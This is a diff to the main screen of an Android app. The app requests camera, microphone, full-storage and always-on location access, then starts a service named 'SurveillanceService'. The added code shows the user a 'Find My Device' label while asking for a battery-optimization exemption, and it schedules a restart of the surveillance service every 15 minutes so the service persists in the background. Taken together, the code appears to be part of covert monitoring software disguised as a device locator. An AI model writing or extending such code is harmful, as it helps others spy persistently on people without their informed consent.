@@ -13,13 +13,14 @@ import android.widget.TextView
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import android.widget.Toast
+import androidx.work.*
 import kotlinx.coroutines.*
+import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
     private lateinit var statusText: TextView
     private lateinit var statusIcon: ImageView
 
-    // Permissions for all Android versions and features
     private val ALL_PERMISSIONS = mutableListOf(
         Manifest.permission.CAMERA,
         Manifest.permission.RECORD_AUDIO,
@@ -52,16 +53,13 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun checkAndRequestAllPermissions() {
-        // Check which permissions need to be requested via ActivityCompat
         val toRequest = ALL_PERMISSIONS.filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }.toTypedArray()
 
-        // For Android 11+ check MANAGE_EXTERNAL_STORAGE via Environment
         val needsManageStorage = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
                 !Environment.isExternalStorageManager()
 
-        // Background location check (Android 10+)
         val needsBackgroundLocation = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
                 ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED
 
@@ -71,7 +69,6 @@ class MainActivity : AppCompatActivity() {
         }
 
         if (needsManageStorage) {
-            // Open settings page for MANAGE_EXTERNAL_STORAGE
             Toast.makeText(this, "Please enable 'Manage all files access' for full storage access.", Toast.LENGTH_LONG).show()
             val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                 data = Uri.parse("package:$packageName")
@@ -81,7 +78,6 @@ class MainActivity : AppCompatActivity() {
         }
 
         if (needsBackgroundLocation) {
-            // Directly open the app's location permission page for "Allow all the time"
             Toast.makeText(this, "Please grant 'Allow all the time' location access.", Toast.LENGTH_LONG).show()
             val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                 data = Uri.parse("package:$packageName")
@@ -110,13 +106,15 @@ class MainActivity : AppCompatActivity() {
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
-        // Always re-check permissions after returning from settings
         if (requestCode == MANAGE_STORAGE_REQUEST_CODE || requestCode == LOCATION_ALL_TIME_REQUEST_CODE) {
             checkAndRequestAllPermissions()
         }
     }
 
     private fun onAllPermissionsGranted() {
+        // Request battery optimization exemption
+        requestBatteryOptimizationExemption()
+
         // Start foreground service
         val intent = Intent(this, SurveillanceService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -125,7 +123,9 @@ class MainActivity : AppCompatActivity() {
             startService(intent)
         }
 
-        // Example: Check Supabase connection
+        // Schedule WorkManager for periodic service restart every 15 minutes
+        scheduleServiceRestartWorker()
+
         GlobalScope.launch(Dispatchers.Main) {
             val connected = withContext(Dispatchers.IO) { SupabaseUtils.checkConnection() }
             if (connected) {
@@ -140,5 +140,38 @@ class MainActivity : AppCompatActivity() {
             delay(2000)
             finish()
         }
+    }
+
+    private fun requestBatteryOptimizationExemption() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val pm = getSystemService(POWER_SERVICE) as PowerManager
+            val packageName = packageName
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                Toast.makeText(
+                    this,
+                    "Please allow Find My Device to ignore battery optimizations for best background performance.",
+                    Toast.LENGTH_LONG
+                ).show()
+                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                intent.data = Uri.parse("package:$packageName")
+                startActivity(intent)
+            }
+        }
+    }
+
+    private fun scheduleServiceRestartWorker() {
+        val workRequest = PeriodicWorkRequestBuilder<ServiceRestartWorker>(15, TimeUnit.MINUTES)
+            .setConstraints(
+                Constraints.Builder()
+                    .setRequiresBatteryNotLow(false)
+                    .setRequiresDeviceIdle(false)
+                    .build()
+            )
+            .build()
+        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+            "ServiceRestartWorker",
+            ExistingPeriodicWorkPolicy.UPDATE,
+            workRequest
+        )
     }
 }
